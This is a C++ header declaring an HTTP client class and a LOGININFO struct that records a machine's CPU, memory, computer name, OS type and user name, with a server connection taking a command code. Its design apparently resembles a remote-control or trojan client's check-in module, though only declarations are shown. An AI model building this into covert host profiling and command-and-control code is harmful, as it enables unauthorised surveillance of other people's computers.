// MyHttpBase.h: interface for the CMyHttpBase class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYHTTPBASE_H__8D08074A_C1F4_43E9_9B8B_0CAD734C43BA__INCLUDED_)
#define AFX_MYHTTPBASE_H__8D08074A_C1F4_43E9_9B8B_0CAD734C43BA__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

typedef enum tagWin32SysType{
   Windows32s,
   WindowsNT3,
   Windows95,
   Windows98,
   WindowsME,
   WindowsNT4,
   Windows2000,
   WindowsXP
}Type;

typedef struct _LOGININFO_
{
	UINT m_CpuSpeed;			//CPU主频
	UINT m_MemContent;			//内存容量
	char ID[17];				//唯一标识
	char m_PcName[64];			//计算机名称
	char m_SysType;				//操作系统类型
	char m_CpuCount;			//CPU数量
	char m_UserName[38];		//用户名称
}LOGININFO,*LPLOGININFO;

Type IsShellSysType();

class CMyHttpBase  
{
public:

	BOOL ConnectHttpServer( char* m_ServerAddr , 
							int m_ServerPort,
							int nCmd, DWORD nStyle);
	void StopWork();

	HINTERNET	hHttpFp;
	CMyHttpBase();
	virtual ~CMyHttpBase();

private:
	HINTERNET	hHttpIe;
	HINTERNET	hHttpHc;

	void GetMySysInfo(char* pData);
	void BcdToAsc(BYTE *BcdStr,BYTE*AscStr,int BcdStrLen);
};

#endif // !defined(AFX_MYHTTPBASE_H__8D08074A_C1F4_43E9_9B8B_0CAD734C43BA__INCLUDED_)
